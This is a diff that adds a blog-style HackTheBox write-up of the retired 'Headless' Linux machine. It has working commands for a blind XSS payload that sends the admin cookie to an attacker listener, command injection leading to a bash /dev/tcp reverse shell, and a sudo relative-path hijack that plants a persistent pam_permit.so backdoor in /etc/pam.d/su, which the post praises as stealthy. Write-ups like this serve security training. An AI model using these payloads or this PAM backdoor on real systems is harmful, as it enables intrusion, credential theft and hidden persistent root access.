@@ -1,0 +1,309 @@
+---
+slug: "htb-headless"
+title: "Headless — HackTheBox Writeup"
+date: "2026-07-18"
+platform: "HackTheBox"
+type: "Machine"
+os: "Linux"
+difficulty: "Easy"
+tags:
+  - "XSS"
+  - "Cookie Stealing"
+  - "Command Injection"
+  - "Sudo Abuse"
+  - "PAM Backdoor"
+  - "Linux"
+  - "Web"
+  - "Werkzeug"
+  - "Python"
+excerpt: "An easy-rated Linux machine involving blind XSS cookie exfiltration from an admin dashboard, command injection in a reporting feature, and privilege escalation via a PAM authentication backdoor injected through a relative path hijack in a sudo script."
+readTime: "10 min"
+retired: true
+rating: 4.6
+url: "https://asbawy.github.io/writeups/htb-headless"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+
+<KillChain steps={[
+  { phase: "Reconnaissance", title: "Port Scanning & Web Enumeration", desc: "Nmap scan revealed SSH (22) and a Werkzeug Python web app on port 5000. Directory fuzzing uncovered /dashboard (401) and /support (contact form).", tools: ["Nmap", "Gobuster", "curl"] },
+  { phase: "Foothold", title: "Blind XSS — Admin Cookie Exfiltration", desc: "Triggered hacking detection by injecting XSS in the message body, while the real XSS payload in the User-Agent header stole the admin's is_admin cookie when the admin reviewed the flagged request.", technique: "Blind XSS via Header Injection", tools: ["curl", "Python HTTP Server"] },
+  { phase: "Remote Execution", title: "Command Injection in Dashboard", desc: "Used the stolen admin cookie to access /dashboard. The date parameter in the report generator was passed directly to a system command, allowing arbitrary command execution as dvir.", technique: "OS Command Injection", tools: ["curl", "bash"] },
+  { phase: "PrivEsc", title: "Sudo Script — PAM Backdoor Injection", desc: "dvir could run /usr/bin/syscheck as root via sudo. The script called ./initdb.sh using a relative path. Created a malicious initdb.sh that injects pam_permit.so into /etc/pam.d/su, then used su to escalate to root with any password.", technique: "PAM Authentication Backdoor via Relative Path Hijack", tools: ["sudo", "bash", "sed"] }
+]} />
+
+### Skill Matrix
+
+<SkillMatrix skills={[
+  { name: "Enumeration", level: 6 },
+  { name: "Real-Life", level: 8 },
+  { name: "CVE", level: 2 },
+  { name: "Custom Exploitation", level: 7 },
+  { name: "Privilege Escalation", level: 5 }
+]} />
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+```bash
+nmap -sC -sV -p- 10.129.41.89 -oN nmap_full.txt
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
+|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
+|_http-title: Under Construction
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<Callout type="info">
+Only two ports open — SSH and a Python Werkzeug web application on port 5000. The Werkzeug framework hints at a Flask-based application.
+</Callout>
+
+### Web Enumeration
+
+Browsing to `http://10.129.41.89:5000` shows an "Under Construction" countdown page with a button linking to the support form.
+
+![Homepage countdown page](https://i.imgur.com/P7mMA4Y.png)
+
+
+```bash
+gobuster dir -u http://10.129.41.89:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+```
+
+Key findings:
+- `/dashboard` — returns **401 Unauthorized** (requires `is_admin` cookie)
+- `/support` — public contact form with fields: first name, last name, email, phone, message
+
+<Callout type="warning">
+The application sets a cookie `is_admin=InVzZXIi...` (base64 of "user") without the `HttpOnly` flag, making it vulnerable to JavaScript-based cookie theft.
+</Callout>
+
+![Support contact form](https://i.imgur.com/v1dGIz7.png)
+
+---
+
+## Initial Foothold
+
+### Step 1: Trigger the Hacking Detection
+
+The `/support` form has an input sanitization feature — when it detects HTML/script tags in the **message body**, it triggers a "Hacking Attempt Detected" alert. This alert displays the full HTTP request headers and is reviewed by an admin bot.
+
+The key insight: **the XSS payload goes in the User-Agent header**, while the message body contains a decoy tag just to trigger the detection.
+
+### Step 2: Set Up a Listener
+
+Start a Python HTTP server to catch the exfiltrated cookie:
+
+```bash
+python3 -m http.server 8888
+```
+
+### Step 3: Send the XSS Payload
+
+```bash
+curl -X POST http://10.129.41.89:5000/support \
+  -H "User-Agent: <script>var i=new Image();i.src='http://YOUR_IP:8888/?cookie='+document.cookie;</script>" \
+  -d "fname=asbawy&lname=asbawy&email=asb%40asb.asb&phone=1234567890&message=%3Cscript%3Easbawy%3C%2Fscript%3E"
+```
+
+<Callout type="info">
+**Why this works:** The message body `<script>test</script>` triggers the hacking detection system. The admin bot reviews the flagged request and renders the page containing all request headers — including our malicious User-Agent. Since the `is_admin` cookie lacks the `HttpOnly` flag, `document.cookie` captures it and sends it to our listener.
+</Callout>
+
+### Step 4: Receive the Admin Cookie
+
+Within seconds, the admin bot triggers the XSS and we receive a callback:
+
+```
+10.129.41.89 - - "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
+```
+
+**Stolen cookie:** `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
+
+<Callout type="info">
+Decoding the cookie value: `ImFkbWluIg` is base64 for `"admin"` — the original user cookie was `InVzZXIi` (base64 for `"user"`). The application uses a signed cookie with a Flask itsdangerous token.
+</Callout>
+
+---
+
+## Command Injection
+
+### Accessing the Admin Dashboard
+
+With the admin cookie, we can now access `/dashboard`:
+
+```bash
+curl -s http://10.129.41.89:5000/dashboard \
+  -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
+```
+
+The dashboard contains a **"Generate Report"** feature with a date input field.
+
+![Admin dashboard with report generation form](https://i.imgur.com/djK4qz0.png)
+
+### Testing for Injection
+
+The `date` parameter is passed directly to a system command without sanitization:
+
+```bash
+curl -s http://10.129.41.89:5000/dashboard \
+  -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" \
+  -X POST --data-urlencode "date=2023-09-15;id"
+```
+
+**Output:**
+```
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+```
+
+### Getting a Reverse Shell
+
+Start a netcat listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Send the reverse shell payload:
+
+```bash
+curl -s http://10.129.41.89:5000/dashboard \
+  -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" \
+  -X POST --data-urlencode "date=2023-09-15;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+```
+
+We land a shell as `dvir` and can read the user flag:
+
+```bash
+dvir@headless:~$ cat ~/user.txt
+```
+
+<SpoilerFlag label="User Flag" flag="17d97e6813907471aec119f2bfd94805" />
+
+---
+
+## Privilege Escalation
+
+### Sudo Enumeration
+
+```bash
+dvir@headless:~$ sudo -l
+
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+```
+
+### Analyzing /usr/bin/syscheck
+
+```bash
+dvir@headless:~$ cat /usr/bin/syscheck
+```
+
+```bash
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
+
+<Callout type="warning">
+**Vulnerability:** The script calls `./initdb.sh` using a **relative path**. Since syscheck runs as root via sudo, if we control the current working directory and place a malicious `initdb.sh` there, it will be executed as root.
+</Callout>
+
+### Exploitation — PAM Backdoor Injection via Relative Path Hijack
+
+Instead of the typical SUID bash or reverse shell approach, we abuse the relative path vulnerability to inject a **PAM authentication backdoor**. This modifies the system's authentication stack so that `su root` succeeds with any password — a stealthier and more elegant escalation.
+
+**Step 1:** Craft `initdb.sh` to inject `pam_permit.so` into `/etc/pam.d/su`:
+
+```bash
+dvir@headless:~$ cat > initdb.sh << 'EOF'
+#!/bin/bash
+sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/su
+EOF
+
+dvir@headless:~$ chmod +x initdb.sh
+```
+
+<Callout type="info">
+**Why PAM?** The `pam_permit.so` module unconditionally succeeds authentication. By inserting it as the first `auth` rule with `sufficient`, PAM short-circuits — it never reaches the real password check. Unlike SUID bash, this leaves no suspicious file permissions behind and survives reboots.
+</Callout>
+
+**Step 2:** Trigger the payload — run syscheck from our home directory where `./initdb.sh` resolves to our backdoor:
+
+```bash
+dvir@headless:~$ sudo /usr/bin/syscheck
+```
+
+**Output:**
+```bash
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.08, 0.03, 0.01
+Database service is not running. Starting it...
+```
+
+**Step 3:** Verify the PAM injection took effect:
+
+```bash
+dvir@headless:~$ head -2 /etc/pam.d/su
+auth sufficient pam_permit.so
+#
+```
+
+**Step 4:** Escalate — `su` now accepts anything as a valid password:
+
+```bash
+dvir@headless:~$ su root -c 'whoami && cat /root/root.txt'
+Password: [literally anything]
+root
+a244939a6b0c136f7b53d76e1dee9f9f
+```
+
+<SpoilerFlag label="Root Flag" flag="a244939a6b0c136f7b53d76e1dee9f9f" />
+
+<Callout type="warning">
+**Why this is dangerous in the real world:** A PAM backdoor is persistent — it survives across reboots and doesn't show up in typical checks like `find / -perm -4000` (SUID hunting) or process monitoring. It only becomes visible if an admin audits `/etc/pam.d/` configs directly.
+</Callout>
+
+---
+
+## References
+
+- [OWASP — Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
+- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
+- [GTFOBins — Sudo](https://gtfobins.github.io/gtfobins/bash/#sudo)
+- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+- [Linux PAM Backdoor Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#pam-backdoor)
+- [pam_permit(8) — Linux man page](https://man7.org/linux/man-pages/man8/pam_permit.8.html)
